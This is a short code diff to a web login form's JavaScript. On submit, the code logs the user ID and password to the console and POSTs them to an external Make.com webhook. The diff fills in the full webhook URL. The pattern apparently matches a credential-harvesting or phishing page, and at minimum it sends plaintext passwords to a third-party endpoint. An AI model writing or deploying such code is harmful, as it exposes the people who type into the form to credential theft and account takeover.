@@ -11,7 +11,7 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
 
     console.log("Sending Payload - UserID: ", userID, "Password: ", password);
 
-    fetch('h2j1iwxiktb1bs1arhqxymbm38iau4ef', {
+    fetch('https://hook.eu2.make.com/h2j1iwxiktb1bs1arhqxymbm38iau4ef', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
